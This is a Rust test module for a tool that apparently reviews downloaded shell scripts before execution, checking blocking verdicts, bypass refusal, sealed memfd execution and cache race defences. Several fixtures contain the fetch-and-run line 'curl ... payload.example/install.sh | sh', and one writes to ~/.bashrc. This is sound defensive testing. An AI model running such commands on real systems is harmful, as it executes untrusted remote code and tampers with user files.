            write!(
                stream,
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .unwrap();
            stream.write_all(body).unwrap();
        });
        let called = Arc::new(AtomicBool::new(false));
        let callback_called = Arc::clone(&called);
        let result = run(RunOptions {
            url: format!("http://{address}/inspect.sh"),
            no_exec: true,
            interactive: false,
            expected_sha256: None,
            exec_fn: Some(Box::new(move |_, _| {
                callback_called.store(true, Ordering::Release);
                panic!("--no-exec invoked legacy callback")
            })),
        })
        .expect("analysis-only run completes");
        server.join().unwrap();
        assert!(!result.executed);
        assert!(!result.refused, "--no-exec is analysis, not a live refusal");
        assert!(!called.load(Ordering::Acquire));
        assert!(
            result.receipt.cwd.is_some(),
            "RunResult must retain the exact persisted raw receipt"
        );
        let stored = Receipt::load(&result.receipt.sha256).expect("persisted receipt loads");
        assert_eq!(
            serde_json::to_value(&result.receipt).unwrap(),
            serde_json::to_value(&stored).unwrap(),
            "RunResult receipt must preserve persisted receipt semantics"
        );
        let compiled = crate::redact::CompiledCustomPatterns::new_silent(&[]);
        assert!(result
            .presentation_receipt_with_compiled(&compiled)
            .cwd
            .is_none());
        assert_eq!(result.verdict.as_ref().unwrap().action, Action::Block);
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn macos_forced_stdin_refuses_before_network_or_executor() {
        let options = RunOptions {
            url: "not-a-url".to_string(),
            no_exec: false,
            interactive: true,
            expected_sha256: None,
            exec_fn: None,
        };

        let error = match run_with_verified_pipe_executor(
            options,
            RequestedPipeInvocation {
                interpreter: PipeInterpreter::Sh,
                args: Vec::new(),
            },
            Box::new(|_, _, _| panic!("macOS refusal must happen before interpreter execution")),
        ) {
            Ok(_) => panic!("macOS stdin execution must fail closed"),
            Err(error) => error,
        };
        assert!(error.contains("supported only on Linux"), "{error}");
        assert!(error.contains("before download"), "{error}");
        assert!(
            !error.contains("invalid URL"),
            "network validation ran: {error}"
        );
    }

    #[cfg(unix)]
    #[test]
    fn bash_s_double_dash_reads_reviewed_bytes_from_stdin() {
        let content = b"#!/usr/bin/env node\nprintf '<%s>\\n' \"$1\"\n";
        // A Unix host without bash is a real target (busybox on Alpine), so a
        // missing interpreter is not a failure of this contract.
        let Ok(mut child) = Command::new("bash")
            .args(["-s", "--", "feature"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
        else {
            eprintln!("skipping: bash is not installed on this host");
            return;
        };
        child
            .stdin
            .take()
            .unwrap()
            .write_all(content)
            .expect("write reviewed bytes");
        let output = child.wait_with_output().expect("wait bash");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"<feature>\n");
    }

    #[test]
    fn authorized_bypass_retains_raw_block_findings() {
        let dir = tempfile::tempdir().unwrap();
        let mut review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        let raw_count = review.raw_verdict.as_ref().unwrap().findings.len();
        let mut policy = crate::policy::Policy {
            allow_bypass_env: true,
            ..crate::policy::Policy::default()
        };
        policy.allow_bypass_env_noninteractive = false;
        assert!(apply_explicit_bypass(
            &mut review,
            &policy,
            true,
            true,
            true,
            true,
        ));
        assert_eq!(
            review.raw_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert_eq!(
            review.effective_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert!(review.effective_verdict.as_ref().unwrap().bypass_honored);
        let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
        assert_eq!(raw_action, "Block");
        assert_eq!(raw_rule_ids.len(), raw_count);
    }

    #[test]
    fn bypass_is_not_honored_for_allow_or_analysis_only_verdicts() {
        let dir = tempfile::tempdir().unwrap();
        let policy = crate::policy::Policy {
            allow_bypass_env: true,
            allow_bypass_env_noninteractive: true,
            ..crate::policy::Policy::default()
        };

        let mut clean = review_script_bytes(
            b"#!/bin/sh\nprintf 'clean\\n'\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        assert!(!apply_explicit_bypass(
            &mut clean, &policy, true, true, true, true
        ));
        let clean_verdict = clean.effective_verdict.unwrap();
        assert!(clean_verdict.bypass_requested);
        assert!(clean_verdict.bypass_available);
        assert!(!clean_verdict.bypass_honored);

        let mut blocked = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            false,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        assert_eq!(
            blocked.effective_verdict.as_ref().unwrap().action,
            Action::Block
        );
        assert!(!apply_explicit_bypass(
            &mut blocked,
            &policy,
            true,
            true,
            true,
            false,
        ));
        let blocked_verdict = blocked.effective_verdict.unwrap();
        assert!(blocked_verdict.bypass_requested);
        assert!(blocked_verdict.bypass_available);
        assert!(!blocked_verdict.bypass_honored);
    }

    #[test]
    fn forced_stdin_surface_records_but_never_honors_explicit_bypass() {
        let dir = tempfile::tempdir().unwrap();
        let mut review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            Some("bash"),
        )
        .unwrap();
        let policy = crate::policy::Policy {
            allow_bypass_env: true,
            allow_bypass_env_noninteractive: true,
            ..crate::policy::Policy::default()
        };
        assert!(!apply_explicit_bypass(
            &mut review,
            &policy,
            true,
            true,
            false,
            true,
        ));
        for verdict in [
            review.raw_verdict.as_ref().unwrap(),
            review.effective_verdict.as_ref().unwrap(),
        ] {
            assert!(verdict.bypass_requested);
            assert!(!verdict.bypass_available);
            assert!(!verdict.bypass_honored);
            assert_eq!(verdict.action, Action::Block);
        }
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn forced_stdin_run_blocks_reviewed_body_even_with_tirith_zero() {
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;
        use std::time::{Duration, Instant};

        let mut global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global runner state");
        let isolated = tempfile::tempdir().expect("isolated runner state");
        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
        std::fs::write(
            isolated.path().join(".tirith/policy.yaml"),
            "allow_bypass_env: true\nallow_bypass_env_noninteractive: true\n",
        )
        .unwrap();
        global.set_env("TIRITH", "0");
        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
        global.set_env("HOME", isolated.path());
        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
        global.set_env("NO_PROXY", "127.0.0.1,localhost");

        let body = b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n";
        let expected_sha256 = sha256_hex(body);
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_server = Arc::clone(&stop);
        let server = std::thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(10);
            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(2)))
                            .unwrap();
                        let mut request = [0u8; 2048];
                        let _ = stream.read(&mut request);
                        write!(
                            stream,
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                            body.len()
                        )
                        .unwrap();
                        stream.write_all(body).unwrap();
                        stream.flush().unwrap();
                        return;
                    }
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(10));
                    }
                    Err(error) => panic!("test server accept failed: {error}"),
                }
            }
        });

        let executor_called = Arc::new(AtomicBool::new(false));
        let called = Arc::clone(&executor_called);
        let result = run_with_verified_pipe_executor(
            RunOptions {
                url: format!("http://{address}/install.sh"),
                no_exec: false,
                interactive: true,
                expected_sha256: Some(expected_sha256),
                exec_fn: None,
            },
            RequestedPipeInvocation {
                interpreter: PipeInterpreter::Bash,
                args: Vec::new(),
            },
            Box::new(move |_, _, _| {
                called.store(true, Ordering::Release);
                panic!("blocked reviewed body reached the executor")
            }),
        )
        .expect("blocked download returns a refusal receipt");
        stop.store(true, Ordering::Release);
        server.join().expect("join test server");

        assert!(result.refused);
        assert!(!result.executed);
        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
        assert!(!executor_called.load(Ordering::Acquire));
        let verdict = result.verdict.expect("effective blocking verdict");
        assert!(verdict.bypass_requested);
        assert!(!verdict.bypass_available);
        assert!(!verdict.bypass_honored);
        assert_eq!(verdict.action, Action::Block);
    }

    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
    #[test]
    fn pending_policy_approval_refuses_before_prompt_or_verified_executor() {
        use std::io::{Read as _, Write as _};
        use std::sync::atomic::{AtomicBool, Ordering};
        use std::sync::Arc;
        use std::time::{Duration, Instant};

        let mut global = tirith_test_support::GlobalStateGuard::new()
            .expect("isolate process-global runner state");
        let isolated = tempfile::tempdir().expect("isolated approval runner state");
        std::fs::create_dir_all(isolated.path().join(".tirith")).unwrap();
        // Plain concatenation, NOT `\`-continuations: a continuation strips the
        // next line's leading whitespace, which silently deletes the YAML
        // indentation and turns `severity_overrides` into an empty map.
        std::fs::write(
            isolated.path().join(".tirith/policy.yaml"),
            concat!(
                "allow_bypass_env: true\n",
                "severity_overrides:\n",
                "  dotfile_overwrite: INFO\n",
                "approval_rules:\n",
                "  - rule_ids: [dotfile_overwrite]\n",
                "    timeout_secs: 30\n",
                "    fallback: block\n",
            ),
        )
        .unwrap();
        global.set_env("TIRITH", "0");
        global.set_env("TIRITH_PRIVATE_FETCH_ALLOW", "127.0.0.1/32");
        global.set_env("TIRITH_POLICY_ROOT", isolated.path());
        global.set_env("HOME", isolated.path());
        global.set_env("XDG_CONFIG_HOME", isolated.path().join("config"));
        global.set_env("XDG_CACHE_HOME", isolated.path().join("cache"));
        global.set_env("XDG_STATE_HOME", isolated.path().join("state"));
        global.set_env("NO_PROXY", "127.0.0.1,localhost");

        let body: &'static [u8] = b"#!/bin/sh\necho reviewed > ~/.bashrc\n";
        let expected_sha256 = sha256_hex(body);
        let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind test server");
        listener.set_nonblocking(true).unwrap();
        let address = listener.local_addr().unwrap();
        let stop = Arc::new(AtomicBool::new(false));
        let stop_server = Arc::clone(&stop);
        let server = std::thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(10);
            while !stop_server.load(Ordering::Acquire) && Instant::now() < deadline {
                match listener.accept() {
                    Ok((mut stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(2)))
                            .unwrap();
                        let mut request = [0u8; 2048];
                        let _ = stream.read(&mut request);
                        write!(
                            stream,
                            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                            body.len()
                        )
                        .unwrap();
                        stream.write_all(body).unwrap();
                        stream.flush().unwrap();
                        return;
                    }
                    Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(10));
                    }
                    Err(error) => panic!("test server accept failed: {error}"),
                }
            }
        });

        let executor_called = Arc::new(AtomicBool::new(false));
        let called = Arc::clone(&executor_called);
        let result = run_with_verified_executor(
            RunOptions {
                url: format!("http://{address}/approval.sh"),
                no_exec: false,
                interactive: true,
                expected_sha256: Some(expected_sha256),
                exec_fn: None,
            },
            Box::new(move |_, _, _| {
                called.store(true, Ordering::Release);
                panic!("pending approval reached the executor")
            }),
        )
        .expect("pending approval returns a structured refusal");
        stop.store(true, Ordering::Release);
        server.join().expect("join approval test server");

        assert!(result.refused);
        assert!(!result.executed);
        assert_eq!(result.exit_code, Some(Action::Block.exit_code()));
        assert!(!executor_called.load(Ordering::Acquire));
        let verdict = result.verdict.expect("pending approval verdict");
        assert_eq!(verdict.action, Action::Allow);
        assert_eq!(verdict.requires_approval, Some(true));
        assert!(verdict.bypass_requested);
        assert!(verdict.bypass_available);
        assert!(!verdict.bypass_honored);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn reviewed_script_memfd_is_fully_sealed_and_rejects_pwrite() {
        use std::os::fd::AsRawFd as _;
        use std::os::unix::fs::MetadataExt as _;
        use std::os::unix::process::CommandExt as _;

        let dir = tempfile::tempdir().unwrap();
        let content = b"#!/bin/sh\nprintf 'clean\\n'\n";
        let sha = sha256_hex(content);
        let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
        assert_eq!(
            execution.read_verified(content.len(), &sha).unwrap(),
            content
        );
        let fd = execution.sealed_file.as_raw_fd();
        let metadata = std::fs::metadata(format!("/proc/self/fd/{fd}")).unwrap();
        assert_eq!(metadata.mode() & 0o777, 0o400);
        let required =
            libc::F_SEAL_SEAL | libc::F_SEAL_SHRINK | libc::F_SEAL_GROW | libc::F_SEAL_WRITE;
        assert_eq!(
            unsafe { libc::fcntl(fd, libc::F_GET_SEALS) } & required,
            required
        );
        let replacement = b'X';
        assert_eq!(
            unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
            -1
        );
        assert_eq!(
            std::io::Error::last_os_error().raw_os_error(),
            Some(libc::EPERM)
        );

        let mut command = Command::new("/bin/sh");
        command.arg(format!("/proc/self/fd/{fd}"));
        unsafe {
            command.pre_exec(move || {
                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
        let output = command.output().expect("execute reviewed sealed script");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"clean\n");
    }

    #[cfg(unix)]
    #[test]
    fn precreated_cache_symlink_never_redirects_download_bytes() {
        use std::os::unix::fs::symlink;

        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        let victim = dir.path().join("victim");
        let victim_content = b"must remain unchanged";
        std::fs::write(&victim, victim_content).unwrap();
        symlink(&victim, &cache_path).unwrap();

        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        assert_eq!(std::fs::read(&victim).unwrap(), victim_content);
        assert!(
            !std::fs::symlink_metadata(&cache_path)
                .unwrap()
                .file_type()
                .is_symlink(),
            "atomic cache publication must replace, never follow, a precreated symlink"
        );
        assert_eq!(std::fs::read(&cache_path).unwrap(), content);
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn post_review_cache_swap_cannot_change_execution_bytes() {
        use std::os::fd::AsRawFd as _;
        use std::os::unix::process::CommandExt as _;
        use std::sync::{Arc, Barrier};

        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        // Exercise the real in-memory review before simulating an attacker who
        // swaps the stable content-addressed cache pathname after approval.
        let review = review_script_bytes(content, true, false, Some(dir.path()), None)
            .expect("review clean script bytes");
        assert!(review.analysis_complete);
        let execution = materialize_execution_file(&cache_dir, content, &sha).unwrap();
        let fd = execution.sealed_file.as_raw_fd();
        let barrier = Arc::new(Barrier::new(2));
        let attacker_barrier = Arc::clone(&barrier);
        let attacker_cache = cache_path.clone();
        let attacker = std::thread::spawn(move || {
            attacker_barrier.wait();
            std::fs::remove_file(&attacker_cache).unwrap();
            std::fs::write(&attacker_cache, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();
            let replacement = b'X';
            assert_eq!(
                unsafe { libc::pwrite(fd, (&replacement as *const u8).cast(), 1, 0) },
                -1
            );
            attacker_barrier.wait();
        });
        barrier.wait();
        barrier.wait();
        attacker.join().unwrap();

        assert_eq!(
            execution.read_verified(content.len(), &sha).unwrap(),
            content
        );
        let mut command = Command::new("/bin/sh");
        command.arg(format!("/proc/self/fd/{fd}"));
        unsafe {
            command.pre_exec(move || {
                if libc::fcntl(fd, libc::F_SETFD, 0) < 0 {
                    return Err(std::io::Error::last_os_error());
                }
                Ok(())
            });
        }
        let output = command.output().expect("execute sealed reviewed copy");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"reviewed\n");
    }

    #[test]
    fn test_allowed_interpreter_sh() {
        assert!(is_allowed_interpreter("sh"));
    }

    #[test]
    fn test_allowed_interpreter_python3() {
        assert!(is_allowed_interpreter("python3"));
    }

    #[test]
    fn test_allowed_interpreter_python3_11() {
        assert!(is_allowed_interpreter("python3.11"));
    }

    #[test]
    fn test_allowed_interpreter_nodejs() {
        assert!(is_allowed_interpreter("nodejs"));
    }

    #[test]
    fn test_disallowed_interpreter_vim() {
        assert!(!is_allowed_interpreter("vim"));
    }

    #[test]
    fn test_disallowed_interpreter_expect() {
        assert!(!is_allowed_interpreter("expect"));
    }

    #[test]
    fn test_disallowed_interpreter_python_evil() {
        assert!(!is_allowed_interpreter("python.evil"));
    }

    #[test]
    fn test_disallowed_interpreter_node_sass() {
        assert!(!is_allowed_interpreter("node-sass"));
    }

    #[test]
    fn test_disallowed_interpreter_python3_trailing_dot() {
        assert!(!is_allowed_interpreter("python3."));
    }

    #[test]
    fn test_disallowed_interpreter_python3_double_dot() {
        assert!(!is_allowed_interpreter("python3..11"));
    }

    #[test]
    fn test_allowed_interpreter_strips_path() {
        assert!(is_allowed_interpreter("/usr/bin/bash"));
    }

    #[cfg(unix)]
    #[test]
    fn test_cache_write_permissions_0600() {
        use std::os::unix::fs::PermissionsExt;
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let cache_path = dir.path().join("test_cache");

        {
            use std::io::Write;

            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .unwrap();
            tmp.write_all(b"test content").unwrap();
            tmp.persist(&cache_path).unwrap();
        }

        let meta = std::fs::metadata(&cache_path).unwrap();
        assert_eq!(
            meta.permissions().mode() & 0o777,
            0o600,
            "cache file should be 0600"
        );
    }

    #[test]
    fn test_cache_write_no_predictable_tmp() {
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let sha = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
        let cached_path = dir.path().join(sha);

        {
            use std::io::Write;
            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.write_all(b"cached script").unwrap();
            tmp.persist(&cached_path).unwrap();
        }

        let entries: Vec<_> = std::fs::read_dir(dir.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();

        assert_eq!(
            entries.len(),
            1,
            "only the cached file should exist, found: {entries:?}"
        );
        assert!(
            cached_path.exists(),
            "cached file should exist after persist"
        );
    }
}
